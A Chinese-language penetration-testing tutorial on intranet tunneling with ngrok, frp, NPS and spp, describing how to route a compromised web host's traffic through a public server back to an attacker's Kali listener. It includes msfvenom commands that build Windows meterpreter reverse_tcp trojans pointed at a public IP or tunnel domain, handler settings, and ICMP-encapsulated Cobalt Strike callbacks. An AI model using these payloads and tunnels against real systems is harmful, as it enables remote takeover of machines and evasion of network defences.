# 内网穿透简介

内网穿透是一种网络技术，允许从公共互联网访问位于私有网络内部的设备或服务。其原理涉及两个主要概念：端口映射和数据包转发。

  1. 端口映射（Port Forwarding）：内网穿透通过将公网 IP 地址上的特定端口映射到内部网络中的设备或服务来实现。当来自公网的数据包到达公网 IP 地址上的特定端口时，路由器或穿透工具会将这些数据包转发到内部网络的目标设备或服务上。
  2. 数据包转发：当数据包从公网传入时，穿透工具或路由器将这些数据包接收并重新打包，然后将它们转发到内部网络。这种转发通常是基于某种协议或规则的，以确保数据包按照预期的方式到达目标设备。

图中我们的 kali 是不可访问目标主机的因为都在不同的内网中但是双方都可以访问公网，这时我们可以把内网 msf 监听的端口映射到在公网的服务器上，然后内网 web 主机访问公网这台服务器，这台服务器就会把 web 主机的流量发送到我们内网 kali 的端口上

内网穿透工具有很多种例如 ngrok 花生壳，frp，nps，spp 等

# ngrok 内网穿透

此安全性不高

https://www.ngrok.cc/

注册登陆以后开通隧道

可以选择收费或免费的，隧道协议支持 http，https，tcp 隧道名随意端口选择可用的，本地端口填写我们 kali 监听的 IP 和端口

接着下载客户端

接着在 kali 中执行./sunny clientid 隧道 ID

kali 生成木马 msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=10174 LHOST = 填写刚才的域名 -f exe -o msf3.exe

msf 监听本地的 8888 端口，接着放在 web 主机上运行即可上线

web 主机运行木马后会将流量转发到公网的 10174 端口接着公网服务器会将流量转发到 kali 的 8888 端口完成内网穿透

# frp 内网穿透

https://github.com/fatedier/frp/releases 地址

解压后得到以下文件

frpc 和 frpc.toml 为客户端文件也就是内网 kali 要用到的， frps 和 frps.toml 为服务端文件也就是公网服务器

frps.toml 内容为其中 7000 是服务端的端口可以自定义为想要的端口但是客户端配置文件中要和服务端设置的端口一致

客户端配置 frpc.toml 记得要把公网服务器 9999，5555 端口防火墙放行

接下来 kali 和服务器分别运行 ./frpc -c frpc.toml 和 ./frps -c frps.toml

接下来 msf 生成木马

msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=公网ip -f exe -o msf4.exe

set lhost 192.168.0.107 set lport 4444 run

监听本地 4444 端口

# NPS 穿透代理服务器搭建

https://github.com/ehang-io/nps/releases/tag/v0.26.10

解压后进入 conf 目录编辑 nps.conf 配置文件

分别是 web 登录的账号密码以及端口

IP 加端口就可以访问 web 端了

登陆进去后客服端点击新增，密钥不填会随机生成

kali 下载客户端

运行客户端命令进行连接，接着配置隧道客户端 ID 就是上面那个，目标 IP 就是我们的 kali 监听的端口 ip

接着生成木马 kali 监听本地 4444 端口

记得生成的木马 ip 端口为公网 IP 和上面的 9898 端口，目标运行后即可上线

他还支持 UDP，http，socks 等

# spp 代理隧道

支持的协议：TCP、UDP、RUDP（可靠 UDP）、RICMP（可靠 ICMP）、RHTTP（可靠 HTTP）、KCP、Quic

支持类型：正向代理、反向代理、SOCKS5 正向代理、SOCKS5 反向代理

支持的协议很多

https://github.com/esrrhs/spp/releases

CS 开启监听

一个监听 vps 的 5555 一个监听本地 9898

生成木马选择本地的监听，这样目标主机运行后会将流量发送到本地 9898，接着 spp 把 9898 的 tcp 流量封装成 icmp 协议然后发送到我们 vps 的 5555 端口即可上线
